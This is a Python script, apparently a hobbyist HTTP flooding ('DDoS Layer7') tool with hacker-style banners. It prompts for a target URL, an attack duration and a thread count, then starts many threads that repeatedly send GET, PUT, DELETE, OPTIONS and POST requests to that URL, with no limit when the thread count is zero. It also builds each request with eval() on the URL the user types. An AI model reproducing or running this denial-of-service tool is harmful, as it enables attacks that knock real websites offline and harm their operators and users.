from selenium import webdriver
import time
import os,sys
os.system("cls")
#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############

os.system("clear")
print("""\033[93m
             __      ANONYMOUS       _____
            / /  __ _ _   _  ___ _  |___  |
           / /  / _` | | | |/ _ \ '__| / /
          / /__| (_| | |_| |  __/ |   / /
          \____/\__,_|\__, |\___|_|  /_/
                      |___/
                 ADDED NEW METHOD 
               DDoS Layer7 (DDoS) 💥
""")
print()

import os
import requests
from tqdm import tqdm
from sys import version
from threading import Thread
from colorama import init, Fore, Back, Style

version = "5"

loop = tqdm(total = 1000, position=0, leave=False)
for k in range(1000):
    loop.set_description(f'{Fore.RED}[IV]{Fore.RESET} Loading.....'.format(k))
    loop.update(1)
loop.close()    
os.system('cls') 

def menu():
    print(f'''     
{Fore.LIGHTRED_EX} ██╗██╗░░░██╗
{Fore.LIGHTRED_EX} ██║██║░░░██║ 
{Fore.LIGHTRED_EX} ██║╚██╗░██╔╝ 
{Fore.LIGHTRED_EX} ██║░╚████╔╝░
{Fore.LIGHTRED_EX} ██║░░╚██╔╝░░
{Fore.LIGHTRED_EX} ╚═╝░░░╚═╝░░░
            
              {Fore.RED}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
              {Fore.RED}│  	IV  : {version}  │
              {Fore.RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    {Fore.RESET} ''')

menu()

def menu2(): 
    print(f'''    
{Fore.LIGHTRED_EX} ██╗██╗░░░██╗
{Fore.LIGHTRED_EX} ██║██║░░░██║ 
{Fore.LIGHTRED_EX} ██║╚██╗░██╔╝ 
{Fore.LIGHTRED_EX} ██║░╚████╔╝░
{Fore.LIGHTRED_EX} ██║░░╚██╔╝░░
{Fore.LIGHTRED_EX} ╚═╝░░░╚═╝░░░
                                                Version : {version}
                                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
                                      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {Fore.RESET} ''')

global url, time, file
url     =     input(f'{Fore.LIGHTGREEN_EX}╰──────| URL FOR ATTACK |──────> {Fore.BLUE}')
print(f'')
time    = int(input(f'{Fore.LIGHTGREEN_EX}╰──────| TIMEING ATTACK |──────> {Fore.BLUE} '))
print(f'')
threads = int(input(f'{Fore.LIGHTGREEN_EX}╰──────| GHODRAT|──────> {Fore.BLUE}'))
print('')

loop = tqdm(total = 1000, position=0, leave=False)
for k in range(1000):
    loop.set_description(f'{Fore.RED}[IV]{Fore.RESET} Waiting To Run SOURCE ........'.format(k))
    loop.update(1)
loop.close()    
os.system('cls') 

menu2()

global breakFlag
breakFlag = False

print(f'{Fore.RED} Sending Packet to : {Fore.GREEN}{url}')

def attack(request):
	global url, time, file
	i = 0
	while True:
		try:
			req = eval("requests."+request+"('"+url+"')")
			print(f'{Fore.RED} Sending Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.GREEN}{threads}')
		except:
			print(f'{Fore.RED} Atack Has Ben Errored')
		i+=1
		if time != 0:
			if i>time:
				break

def createThreadings():
	global breakFlag
	try:
		Thread(target=lambda: attack("get")).start()
		Thread(target=lambda: attack("put")).start()
		Thread(target=lambda: attack("delete")).start()
		Thread(target=lambda: attack("options")).start()
		Thread(target=lambda: attack("post")).start()
	except:
		breakFlag = True

if(threads != 0):
	for i in range(threads):
		createThreadings()
else:
	while True:
		createThreadings()
		if(breakFlag):
			break
